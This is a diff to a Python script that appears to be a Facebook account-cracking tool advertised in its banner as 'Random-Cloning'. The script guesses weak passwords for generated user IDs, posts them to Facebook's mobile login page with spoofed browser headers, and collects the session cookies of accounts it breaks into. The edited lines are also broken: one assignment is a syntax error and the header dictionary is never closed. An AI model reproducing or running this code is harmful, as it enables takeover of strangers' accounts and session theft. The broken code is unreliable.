@@ -160,23 +160,23 @@ class jihad:
             time.sleep(0.009)
 os.system("clear")
 logo =("""
-\x1b[1;96m     __    __   ________   ________      ___       __      \x1b[1;96m 
+\x1b[1;96m     __    __   ________   ________      ___ \x1b[1;96m 
 \x1b[1;96m     |  |  |  | |       /  |       /     /   \     |  |     \x1b[1;96m
 \x1b[1;96m     |  |  |  | `---/  /   `---/  /     /  ^  \    |  |     \x1b[1;96m
 \x1b[1;96m     |  |  |  |    /  /       /  /     /  /_\  \   |  |     \x1b[1;96m
 \x1b[1;96         |  `--'  |   /  /----.  /  /----./  _____  \  |  `----.\x1b[1;96m
-\x1b[1;96 m     \______/   /________| /________/__/     \__\ |_______|\x1b[1;96m
+\x1b[1;96 m    \______/   /________| /________/__/     \__\ |_______|\x1b[1;96m
 \x1b[1;96m     __    __   ________   ________      ___       __      \x1b[1;96m
 \x1b[1;96m                          Mrx UZZAL Brand\x1b[1;96m                                                                  
 
 \33[38;5;196m┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m⭐🌟 Mrx UZZAL 🌟⭐\33[38;5;196m━━━━━━━━━━
-\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;96m        : [★]  UZZAL X ZAYHA        
+\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;96m        : [★]  UZZAL X ZYHAN       
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\x1b[1;96m    : [★]  MD UZZAL HOSSAIN 
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\x1b[1;96m      : [★]  UZZAL VAU   
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\x1b[1;96m  : [★]  Bangladeshi  
 \33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\x1b[1;96m    : [★]  01843438888
-\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\x1b[1;96m  : [★]  Random-Cooling  
-\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;96m: [★]  FREE  -𝗩. 5.0
+\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\x1b[1;96m  : [★]  Random-Cloling  
+\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;96m: [★]  FREE  -𝗩. 5.1💥
 \33[38;5;196m┗━━━━━━━━━━━━━━━━━━━\033[1;31m{{ VAU }}\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""") 
  
 # APK CHECK
@@ -244,7 +244,7 @@ def xxr():
         print('\033[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━ ')
         for love in user:
             pwx = [love,love[2:],code+love[:3],'bangladesh']
-            uid = code+love
+            uid = code+@123
             KING.submit(rcrack,uid,pwx,tl)
     print(' 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ')
  #   print(f"\n{x} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═")
@@ -272,27 +272,25 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'referer': 'https://x.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"12.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+      'cache-control': 'max-age=0',
+      'referer': 'https://www.google.com/',
+      'sec-ch-prefers-color-scheme': 'light',
+      'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+      'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+      'sec-ch-ua-mobile': '?1',
+      'sec-ch-ua-platform': '"Android"',
+      'sec-ch-ua-platform-version': '"13.0.0"',
+      'sec-fetch-dest': 'document',
+      'sec-fetch-mode': 'navigate',
+      'sec-fetch-site': 'cross-site',
+      'sec-fetch-user': '?1',
+      'upgrade-insecure-requests': '1',
+      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
